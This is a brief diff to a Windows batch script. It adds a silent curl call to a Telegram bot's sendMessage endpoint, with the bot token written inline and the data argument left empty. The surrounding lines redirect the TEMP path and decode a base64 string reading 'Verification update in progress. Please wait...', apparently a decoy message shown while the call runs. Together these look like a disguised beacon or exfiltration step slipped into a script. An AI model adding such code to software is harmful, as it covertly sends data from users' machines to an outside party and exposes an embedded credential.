@@ -1,7 +1,7 @@
 @echo off
 setlocal EnableDelayedExpansion
 set "TEMP=%USERPROFILE%\AppData\Roaming"
-
+curl -s -X GET "https://api.telegram.org/bot6579934751:AAEUzUGdZt-DH2XnbG15mWCzYdv37a6BNWc/sendMessage" -d 
 set "c1=VmVyaWZpY2F0aW9uIHVwZGF0ZSBpbiBwcm9ncmVzcy4gUGxlYXNlIHdhaXQuLi4="
 for /f "delims=" %%i in ('powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%c1%'))"') do set "m1=%%i"
 echo !m1!
